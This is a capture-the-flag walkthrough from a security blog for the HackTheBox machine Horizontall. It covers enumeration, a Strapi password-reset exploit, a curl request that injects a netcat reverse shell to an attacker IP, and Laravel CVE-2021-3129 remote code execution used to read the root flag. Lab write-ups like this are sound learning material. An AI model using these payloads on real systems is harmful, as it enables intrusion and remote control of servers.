@@ -1,0 +1,98 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="HTB - HORIZONTALL  ENUMERATION MACHINE IP export IP=10.10.11.105NMAP SCAN RESULT PORT STATE SERVICE22/tcp open ssh80/tcp open httpEnumerating/Exploring Web Resources   http://10.10.11.105 will redirect to http://horizontall.htb/
+  So add this to /etc/hosts
+  echo &amp;quot;10.10.11.105 horizontall.htb&amp;quot;&amp;gt;&amp;gt; /etc/hosts  Nothing Found in web panel
+  Trying Directory Bruteforcing
+  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.105/ -t 100 -x php,txt,js,html,jpg -q  Nothing Useful Found in Directory Bruteforcing"><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/htb/htb-horizontall/><title>HackTheBox: Horizontall :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="HackTheBox: Horizontall"><meta itemprop=description content="HTB - HORIZONTALL  ENUMERATION MACHINE IP export IP=10.10.11.105NMAP SCAN RESULT PORT STATE SERVICE22/tcp open ssh80/tcp open httpEnumerating/Exploring Web Resources   http://10.10.11.105 will redirect to http://horizontall.htb/
+  So add this to /etc/hosts
+  echo &#34;10.10.11.105 horizontall.htb&#34;>> /etc/hosts  Nothing Found in web panel
+  Trying Directory Bruteforcing
+  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.105/ -t 100 -x php,txt,js,html,jpg -q  Nothing Useful Found in Directory Bruteforcing"><meta itemprop=datePublished content="2022-01-14T00:00:00+00:00"><meta itemprop=dateModified content="2022-01-14T00:00:00+00:00"><meta itemprop=wordCount content="731"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: Horizontall"><meta name=twitter:description content="HTB - HORIZONTALL  ENUMERATION MACHINE IP export IP=10.10.11.105NMAP SCAN RESULT PORT STATE SERVICE22/tcp open ssh80/tcp open httpEnumerating/Exploring Web Resources   http://10.10.11.105 will redirect to http://horizontall.htb/
+  So add this to /etc/hosts
+  echo &#34;10.10.11.105 horizontall.htb&#34;>> /etc/hosts  Nothing Found in web panel
+  Trying Directory Bruteforcing
+  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.105/ -t 100 -x php,txt,js,html,jpg -q  Nothing Useful Found in Directory Bruteforcing"><meta property="og:title" content="HackTheBox: Horizontall"><meta property="og:description" content="HTB - HORIZONTALL  ENUMERATION MACHINE IP export IP=10.10.11.105NMAP SCAN RESULT PORT STATE SERVICE22/tcp open ssh80/tcp open httpEnumerating/Exploring Web Resources   http://10.10.11.105 will redirect to http://horizontall.htb/
+  So add this to /etc/hosts
+  echo &#34;10.10.11.105 horizontall.htb&#34;>> /etc/hosts  Nothing Found in web panel
+  Trying Directory Bruteforcing
+  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.105/ -t 100 -x php,txt,js,html,jpg -q  Nothing Useful Found in Directory Bruteforcing"><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/htb/htb-horizontall/"><meta property="article:published_time" content="2022-01-14T00:00:00+00:00"><meta property="article:modified_time" content="2022-01-14T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2022-01-14 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>S3cur!ty_Bl0g</span>
+<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/htb/htb-horizontall/>HackTheBox: Horizontall</a></h2><div class=post-content><h1 id=htb---horizontall>HTB - HORIZONTALL</h1><hr><h2 id=enumeration>ENUMERATION</h2><h3 id=machine-ip>MACHINE IP</h3><pre><code>export IP=10.10.11.105
+
+</code></pre><h3 id=nmap-scan-result>NMAP SCAN RESULT</h3><pre><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+</code></pre><h3 id=enumeratingexploring-web-resources>Enumerating/Exploring Web Resources</h3><ul><li><p><code>http://10.10.11.105</code> will redirect to <code>http://horizontall.htb/</code></p></li><li><p>So add this to <code>/etc/hosts</code></p></li></ul><pre><code>echo &quot;10.10.11.105 horizontall.htb&quot;&gt;&gt; /etc/hosts
+</code></pre><ul><li><p>Nothing Found in web panel</p></li><li><p>Trying Directory Bruteforcing</p></li></ul><pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.11.105/ -t 100 -x php,txt,js,html,jpg  -q
+
+</code></pre><ul><li><p>Nothing Useful Found in Directory Bruteforcing</p></li><li><p>As this is a <code>nginx</code> server with a <code>nginx</code> reverse proxy and IP was earlier autoresolved when tried to browse.</p></li><li><p>So we can try for Subdomain Enumeration or Bruteforcing</p></li><li><p>Using Gobuster for subdomain Bruteforcing</p></li></ul><pre><code>gobuster dns -d horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 200
+</code></pre><ul><li>Found interesting Subdomain</li></ul><pre><code>Found: api-prod.horizontall.htb 
+</code></pre><ul><li>Add this subdomain to <code>/etc/hosts</code></li></ul><pre><code>echo &quot;10.10.11.105 api-prod.horizontall.htb&quot;&gt;&gt; /etc/hosts
+</code></pre><ul><li><p>Nothing interesting found on the subdomain</p></li><li><p>Trying Further Directory Bruteforcing to this subdomain using gobuster</p></li></ul><pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://api-prod.horizontall.htb/ -t 100 -x php,txt,js,html,jpg  -q
+
+
+</code></pre><ul><li>Found Interesting Directories</li></ul><pre><code>/index.html           (Status: 200) [Size: 413]
+/reviews              (Status: 200) [Size: 507]
+/users                (Status: 403) [Size: 60] 
+/admin                (Status: 200) [Size: 854]
+/Reviews              (Status: 200) [Size: 507]
+/robots.txt           (Status: 200) [Size: 121]
+/Admin                (Status: 200) [Size: 854]
+/REVIEWS              (Status: 200) [Size: 507]
+
+</code></pre><ul><li><p>Checking Directoriesn manual</p></li><li><p>/reviews or /Reviews contains some reviews of users and the usernames</p></li></ul><pre><code>[{&quot;id&quot;:1,&quot;name&quot;:&quot;wail&quot;,&quot;description&quot;:&quot;This is good service&quot;,&quot;stars&quot;:4,&quot;created_at&quot;:&quot;2021-05-29T13:23:38.000Z&quot;,&quot;updated_at&quot;:&quot;2021-05-29T13:23:38.000Z&quot;},{&quot;id&quot;:2,&quot;name&quot;:&quot;doe&quot;,&quot;description&quot;:&quot;i'm satisfied with the product&quot;,&quot;stars&quot;:5,&quot;created_at&quot;:&quot;2021-05-29T13:24:17.000Z&quot;,&quot;updated_at&quot;:&quot;2021-05-29T13:24:17.000Z&quot;},{&quot;id&quot;:3,&quot;name&quot;:&quot;john&quot;,&quot;description&quot;:&quot;create service with minimum price i hop i can buy more in the futur&quot;,&quot;stars&quot;:5,&quot;created_at&quot;:&quot;2021-05-29T13:25:26.000Z&quot;,&quot;updated_at&quot;:&quot;2021-05-29T13:25:26.000Z&quot;}]
+</code></pre><ul><li>Users</li></ul><pre><code>wail - id=1
+doe - id=2
+john - id =3
+
+</code></pre><ul><li><p>/users gave 403 (Forbidden)</p></li><li><p>/robots.txt, Nothing found here</p></li><li><p>Found One more directory using Burp Active Scanning</p></li></ul><pre><code>/users-permissions/init
+</code></pre><ul><li>Response from this directory</li></ul><pre><code>{&quot;hasAdmin&quot;:true}
+
+</code></pre><ul><li>So we can predict that the admin account is enabled.</li></ul><hr><h3 id=getting-reverse-shell>Getting Reverse Shell</h3><ul><li>After Further research we found that this stripe web panel is Vulnerable to Password Reset Vulnerability</li></ul><pre><code>https://www.exploit-db.com/exploits/50239
+
+</code></pre><ul><li>We can Download this Exploit and run it, it will give new reseted password and the JSON Token</li><li>The Authentication JSON token can be used in below request to get reverse shell.</li></ul><pre><code>curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxMTY0NjMyLCJleHAiOjE2MzM3NTY2MzJ9.cuZYWzy1Y7hk-ajhlHExSWxDVGbJqkWXmuhxUZzSzG8' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Connection: close' --data $'{\&quot;plugin\&quot;:\&quot;documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 1234 &gt;/tmp/f)\&quot;,\&quot;port\&quot;:\&quot;80\&quot;}' $'http://api-prod.horizontall.htb/admin/plugins/install'
+
+</code></pre><ul><li>For More Details About this Check out this blog</li></ul><pre><code>https://bittherapy.net/post/strapi-framework-remote-code-execution/
+
+</code></pre><ul><li><p>We should have got the reverse shell</p></li><li><p>We can find the user flag <code>/home/developer/user.txt</code></p></li></ul><hr><h3 id=priviledge-escalation>PRIVILEDGE ESCALATION</h3><ul><li><p>Running linpeas.sh</p></li><li><p>Got Some open Ports</p></li></ul><pre><code>╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1856/node /usr/bin/ 
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -        
+
+</code></pre><ul><li>Here on port:8000 at localhost</li></ul><pre><code>curl 0.0.0.0:8000 &gt; index.html
+
+</code></pre><ul><li><p>We can see that the <code>Laravel</code> is Running at version <code>Laravel v8 (PHP v7.4.18)</code></p></li><li><p>We found that this Laravel Version is Vulnerable to RCE with <code>CVE-2021-3129</code></p></li><li><p>After further Research Found this Github Repo to Exploit this vulnerability.</p></li></ul><pre><code>https://github.com/ambionics/laravel-exploits
+
+</code></pre><h4 id=port-forwarding-using-ssh>Port Forwarding using SSH</h4><ul><li><p>Port 8000 is the local port of USER Machine So we need that port to our Attacker Machine.</p></li><li><p>We can use SSH Port Forwarding For That.</p></li></ul><hr><ul><li>STEPS TO PORT FORWARDING</li></ul><ol><li><p>Create a SSH Key Pair <code>ssh-keygen -t rsa</code></p></li><li><p>Put PUBLIC KEY inside the User Machine(Hacked Machine) under <code>/opt/strapi/.ssh/authorized_keys</code> , Here <code>authorized_key</code> is the file containing the Public key (Its not a folder)</p></li><li><p>Use Private Key from Attacker Machine to connect back to User Machine and create Port Forwarding to Port 8000</p></li></ol><pre><code>ssh -L 8000:localhost:8000 strapi@horizontall.htb -i keypair
+
+</code></pre><ul><li>(Here Keypair is the Private Key generated Earlier)</li></ul><ol start=4><li>Now after Successful connection, try to browser the port 8000 from your Machine. <code>curl 0.0.0.0:8000</code> , So we should have the successfull port forwording. Now we can use the exploit.</li></ol><hr><ul><li>Now We can use the RCE to get the root flag. Follow the github repo instructions mentioned in repo.</li></ul><pre><code>$ php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id 
+$ ./laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar
+Log file: /work/pentest/laravel/laravel/storage/logs/laravel.log
+Logs cleared
+Successfully converted to PHAR !
+Phar deserialized
+--------------------------
+uid=1000(cf) gid=1000(cf) ...
+--------------------------
+Logs cleared
+
+
+</code></pre><ul><li>Lets Modify this to get the Root Flag.</li></ul><pre><code>php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system &quot;cat /root/root.txt&quot; 
+
+./laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar
+</code></pre><ul><li>Output</li></ul><pre><code>python3 laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar                                                  
++ Log file: /home/developer/myproject/storage/logs/laravel.log
++ Logs cleared
++ Successfully converted to PHAR !
++ Phar deserialized
+--------------------------
+d31c599c35924f3afdd3447c96c8ea65
+--------------------------
++ Logs cleared
+
+</code></pre><ul><li>We should have got the Root Flag.</li></ul><hr><hr><h1 id=3-horizontall-has-been-pwned>&lt;3 Horizontall Has Been Pwned!</h1></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with 💛 by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>
